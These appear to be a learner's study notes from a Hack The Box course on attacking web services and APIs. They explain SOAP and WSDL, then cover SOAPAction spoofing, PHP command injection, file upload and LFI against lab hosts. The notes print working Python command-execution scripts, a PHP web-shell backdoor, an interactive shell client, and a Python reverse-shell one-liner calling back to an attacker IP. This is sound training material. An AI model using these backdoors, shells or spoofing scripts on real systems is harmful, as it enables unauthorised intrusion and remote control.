---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounty-hunter/web-service-and-api-attacks/"}
---

## Introduction to Web Services and [[Cybersecurity/Bug Bounty Hunter/Application Programming Interface\|API]]s

### Web Service vs. API

The terms `web service` and [[Cybersecurity/Bug Bounty Hunter/Application Programming Interface\|Application Programming Interface]] should not be used interchangeably in every case.
- Web services are a type of API. The opposite isn't always true.
- Web services need a network to achieve their objective.
- Web services rarely allow external developer access.
- Web services usually utilize [[Cybersecurity/Bug Bounty Hunter/Simple Object Access Protocol\|SOAP]] for security reasons. APIs can be found using different designs.
- Web services usually utilize the XML format for data encoding. APIs can be found using different fromats to store data, with the most popular being JavaScript Object Notation. ([[Cybersecurity/Bug Bounty Hunter/JavaScript Object Notation\|JSON]])

### Web Service Approaches/Technologies

- XML-RPC
	- Uses XML for encoding and decoding the remote procedure call (RPC) and the respective parameters. HTTP is usually the transport of choice.

```http
  --> POST /RPC2 HTTP/1.0
  User-Agent: Frontier/5.1.2 (WinNT)
  Host: betty.userland.com
  Content-Type: text/xml
  Content-length: 181

  <?xml version="1.0"?>
  <methodCall>
    <methodName>examples.getStateName</methodName>
    <params>
       <param>
 		     <value><i4>41</i4></value>
 		     </param>
		  </params>
    </methodCall>

  <-- HTTP/1.1 200 OK
  Connection: close
  Content-Length: 158
  Content-Type: text/xml
  Date: Fri, 17 Jul 1998 19:55:08 GMT
  Server: UserLand Frontier/5.1.2-WinNT

  <?xml version="1.0"?>
  <methodResponse>
     <params>
        <param>
		      <value><string>South Dakota</string></value>
		      </param>
  	    </params>
   </methodResponse>

```

Payload in XML is usually a single `<methodCall>` structure. The methodcall should contain a `<methodName>` sub item, then `<params>` if nicessary.

- JSON-RPC
	- Uses a JSON to invoke functionality. HTTP is usually the transport.

```http
  --> POST /ENDPOINT HTTP/1.1
   Host: ...
   Content-Type: application/json-rpc
   Content-Length: ...

  {"method": "sum", "params": {"a":3, "b":4}, "id":0}

  <-- HTTP/1.1 200 OK
   ...
   Content-Type: application/json-rpc

   {"result": 7, "error": null, "id": 0}

```


The `{"method": "sum", "params": {"a":3, "b":4}, "id":0}` object is serialized using JSON. Note the three properties: `method`, `params` and `id`. `method` contains the name of the method to invoke. `params` contains an array carrying the arguments to be passed. `id` contains an identifier established by the client. The server must reply with the same value in the response object if included.

- [[Cybersecurity/Bug Bounty Hunter/Simple Object Access Protocol\|SOAP]]
	- SOUP also uses XML but provides more functionalities than XML-RPC. SOAP defines both a header and a payload structure.
	- A Web Services Definition Language declaration is optional.
	- Anatomy of a SOAP Message
		- soap:Envelope: (Required block) Tag to differentiate SOAP from normal XML. This tag requires a `namespace` attribute.
		- souap:Header: (Optional Block) Enables SOAP's extensibility through SOAP.
		- soap:Body: (Required block) Contains the procedure, parameters, and data
		- soap:Fault: (oprional lock) Used within soap:Body for error messages upon a failed API call.

```http
  --> POST /Quotation HTTP/1.0
  Host: www.xyz.org
  Content-Type: text/xml; charset = utf-8
  Content-Length: nnn

  <?xml version = "1.0"?>
  <SOAP-ENV:Envelope
    xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
     SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">

    <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotations">
       <m:GetQuotation>
         <m:QuotationsName>MiscroSoft</m:QuotationsName>
      </m:GetQuotation>
    </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>

  <-- HTTP/1.0 200 OK
  Content-Type: text/xml; charset = utf-8
  Content-Length: nnn

  <?xml version = "1.0"?>
  <SOAP-ENV:Envelope
   xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
    SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">

  <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotation">
  	  <m:GetQuotationResponse>
  	     <m:Quotation>Here is the quotation</m:Quotation>
     </m:GetQuotationResponse>
   </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>

```

-   `WS-BPEL (Web Services Business Process Execution Language)`
    -   WS-BPEL web services are essentially SOAP web services with more functionality for describing and invoking business processes.
    -   WS-BPEL web services heavily resemble SOAP services. For this reason, they will not be included in this module's scope.
-   `RESTful (Representational State Transfer)`
    -   REST web services usually use XML or JSON. WSDL declarations are supported but uncommon. HTTP is the transport of choice, and HTTP verbs are used to access/change/delete resources and use data.

### Web Services Description Language

An XML based file exposed by web services that informs clients of the provided services/methods, including where they reside and the method-calling convention.

Assume we found a SOAP service at http://TGT:3002
- Fuzz for directories with dirbuster.
```shell-session
dirb http://<TARGET IP>:3002

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Mar 25 11:53:09 2022
URL_BASE: http://<TARGET IP>:3002/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://<TARGET IP>:3002/ ----
+ http://<TARGET IP>:3002/wsdl (CODE:200|SIZE:0)                            
                                                                               
-----------------
END_TIME: Fri Mar 25 11:53:24 2022
DOWNLOADED: 4612 - FOUND: 1
```
- Try to cURL into it:
```shell
┌─[parrot@parrot]─[~]
└──╼ $curl http://$TGT:3003/wsdl
Enter a valid param┌─[parrot@parrot]─[~]
└──╼ $
```
No response so try and fuzz for parameters:
```shell-session
$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>:3002/wsdl?FUZZ
 :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error
:: Progress: [537/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro
wsdl [Status: 200, Size: 4461, Words: 967, Lines: 186]
:: Progress: [982/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: 
Progress: [1153/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err::
Progress: [1780/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: 
Progress: [2461/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: 
Progress: [2588/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: 
Progress: [2588/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
We see that wsdl as a parameter gave us a response. cUrl it:
```shell-session
$ curl http://<TARGET IP>:3002/wsdl?wsdl 

<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/"
	xmlns:s="http://www.w3.org/2001/XMLSchema"
	xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
	xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
	xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
	xmlns:tns="http://tempuri.org/"
	xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
	xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
	<wsdl:types>
		<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
			<s:element name="LoginRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
						<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="LoginResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
		</s:schema>
	</wsdl:types>
	<!-- Login Messages -->
	<wsdl:message name="LoginSoapIn">
		<wsdl:part name="parameters" element="tns:LoginRequest"/>
	</wsdl:message>
	<wsdl:message name="LoginSoapOut">
		<wsdl:part name="parameters" element="tns:LoginResponse"/>
	</wsdl:message>
	<!-- ExecuteCommand Messages -->
	<wsdl:message name="ExecuteCommandSoapIn">
		<wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
	</wsdl:message>
	<wsdl:message name="ExecuteCommandSoapOut">
		<wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
	</wsdl:message>
	<wsdl:portType name="HacktheBoxSoapPort">
		<!-- Login Operaion | PORT -->
		<wsdl:operation name="Login">
			<wsdl:input message="tns:LoginSoapIn"/>
			<wsdl:output message="tns:LoginSoapOut"/>
		</wsdl:operation>
		<!-- ExecuteCommand Operation | PORT -->
		<wsdl:operation name="ExecuteCommand">
			<wsdl:input message="tns:ExecuteCommandSoapIn"/>
			<wsdl:output message="tns:ExecuteCommandSoapOut"/>
		</wsdl:operation>
	</wsdl:portType>
	<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
		<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
		<!-- SOAP Login Action -->
		<wsdl:operation name="Login">
			<soap:operation soapAction="Login" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
		<!-- SOAP ExecuteCommand Action -->
		<wsdl:operation name="ExecuteCommand">
			<soap:operation soapAction="ExecuteCommand" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
	</wsdl:binding>
	<wsdl:service name="HacktheboxService">
		<wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
			<soap:address location="http://localhost:80/wsdl"/>
		</wsdl:port>
	</wsdl:service>
</wsdl:definitions>
```
This mess is a WSDL file.

**Note**: WSDL files can be found in many forms, such as `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco` etc. [DISCO](https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/xml-files-publishing-and-discovering-web-services-with-disco-and-uddi) is a Microsoft technology for publishing and discovering Web Services.

This file follows the [WSDL version 1.1](https://www.w3.org/TR/2001/NOTE-wsdl-20010315) layout and consists of the following elements.

- Definition - `<wsdl:definitions>` Root element of all WSDL files. Contains the name of the web serivces, all namespaces across the WSDL and all other service elements.
- DataTypes - `<wsdl:types>`
- Messages - defines the messages to be exchanged.
- Operation - defines the available SOAP actions alongside the encoding of each message.
- Port type: Encapsulates every possible input and output message into an operation. It defines the web service, available operations, and the exchanged messages.
- Binding - Binds the operation to a particular port type. Bindings are like interfaces. So bindings provide web service access details.
- Service - a Client makes a call to the web service through the name of the service specified in the service tag.

## [[Cybersecurity/Bug Bounty Hunter/Simple Object Access Protocol\|SOAP]] Action Spoofing

SOAP messages toward a SOAP servuce should include the operation and the related parameters. If submitted via HTTP, it can have an additional HTTP header called SOAPAction, which contains the operations name.

If a web service considers only the SOAPAction attribute when determining the operation to execute then it may be vulnerable to SOAPAction spoofing.

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

Here we specify _LoginRequest_ in `<soap:Body>` so that our request goes through as pertending to be inside. We then specify the parameters of the execute command so that we can execute a command.

We can automate this script like so:
```python
import requests
import re

tgt = input('What is the target? ')
cmd = '$'
print('Type \'exit\' to exit.')
while cmd != 'exit':
    cmd = input("$ ")
    if cmd == 'exit':
       break 
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    text = requests.post(f"http://{tgt}:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content.decode()
    resultRegex = re.compile(r'<result>(.*\n+)*<\/result>')
    mo = resultRegex.search(text)
    if mo is not None:
        print(mo.group()[8:-10])
    else:
        print(text)
```


## Command Injection

Imagine a connectivity checking service like this:
```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

It's the secondp art of the code that is vulnerable to injection here. The server path is put into an array (by the ridiculously named `explode()` function. ) and then call_user_func_array() is used to execute. The first part of the path becomes the command and the second part becomes  the command.

Explode funciton defn: `explode(string $separator, string $string, int $limit = PHP_INT_MAX): array`

This means that instead of `http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3` an attacker could issue a request as follows. `http://<TARGET IP>:3003/ping-server.php/system/ls`. This constitutes a command injection vulnerability!

## Attacking WordPress "xmlrpc.php"

See [[Cybersecurity/Bug Bounty Hunter/WordPress xmlrpc page\|WordPress xmlrpc page]] and [[Cybersecurity/Bug Bounty Hunter/Hacking WordPress\|Hacking WordPress]].

Recall we can get the methods available via:
````shell-session
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
````

Inside the list of available methods above, [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API) is included. `pingback.ping` allows for XML-RPC pingbacks. According to WordPress, _a [pingback](https://wordpress.com/support/comments/pingbacks/) is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks._

Unfortunately, if pingbacks are available, they can facilitate:

-   IP Disclosure - An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
-   Cross-Site Port Attack (XSPA) - An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
-   Distributed Denial of Service Attack (DDoS) - An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.

## Arbitrary File Upload - [[Cybersecurity/Bug Bounty Hunter/File Upload Attacks\|File Upload Attacks]]

This basically just let us upload a php backdoor, then we used the backdoor for RCE with a python script.
backdoor.php:
```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

Python shell:
```python
import argparse, time, requests, os # imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs") # generates a variable called parser and uses argparse to create a description
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php", required=True) # specifies flags such as -t for a target with a help and required option being true
parser.add_argument("-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload") # similar to above
parser.add_argument("-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes") # similar to above
args = parser.parse_args() # defines args as a variable holding the values of the above arguments so we can do args.option for example.
if args.target == None and args.payload == None: # checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
    parser.print_help() # shows help menu
elif args.target and args.payload: # elif (if they both have values do some action)
    print(requests.get(args.target+"/?cmd="+args.payload).text) ## sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
if args.target and args.option == "yes": # if the target option is set and args.option is set to yes (for a full interactive shell)
    os.system("clear") # clear the screen (linux)
    while True: # starts a while loop (never ending loop)
        try: # try statement
            cmd = input("$ ") # defines a cmd variable for an input() function which our user will enter
            print(requests.get(args.target+"/?cmd="+cmd).text) # same as above except with our input() function value
            time.sleep(0.3) # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema: # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError: # error handling
            print("URL is invalid")
```
We also used this command in the shell to call back to our machine.

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.138",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

## [[Cybersecurity/Bug Bounty Hunter/Local File Inclusion\|Local File Inclusion]]

If we know that the API is at http://TGT:PORT/api

We can fuzz for endpoints: http://TGT:PORT/api/FUZZ

If we get a download endpoint, it may be vulnerable to an LFI.

Check by doing a file traverse to something known like /etc/hosts or /etc/passwd. You may need to URL encode.


## [[Cybersecurity/Bug Bounty Hunter/Cross-Site Scripting/Cross-Site Scripting (XSS)\|Cross-Site Scripting (XSS)]]

Here we notice that the download was reflecting our input. We tried putting in a JS command. It did not work until it was URL encoded. 

## [[Cybersecurity/Bug Bounty Hunter/Server Side Request Forgery\|Server Side Request Forgery]]

We can usually find SSRF in applications or APIS that fetch remote resources. We should fuzz every identified parameter, even if it does not seem tasked with fetching remote resources.

## Regular Expression Denial of Service (ReDoS)

Basically, developers may be matching input against a regex. After some amount of time the API responds. Here we try and craft denial of service by making longer patterns to match.

## [[Cybersecurity/Bug Bounty Hunter/XML External Entity Injection\|XML External Entity Injection]]



